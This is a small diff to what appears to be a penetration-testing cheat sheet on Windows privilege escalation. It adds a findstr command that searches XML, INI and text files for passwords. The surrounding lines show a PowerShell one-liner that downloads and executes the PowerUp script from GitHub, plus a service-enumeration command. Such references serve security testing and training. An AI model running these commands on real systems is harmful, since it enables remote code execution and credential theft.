@@ -334,6 +334,9 @@ PHP:
 - `IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")`  
   `Invoke-AllChecks`
   
+- Search for passwords in ini,xml and txt files:  
+  `findstr /si password *.xml *.ini *.txt`  
+  
 - Check services:  
   `wmic service get name, displayname, pathname, startname`  
 
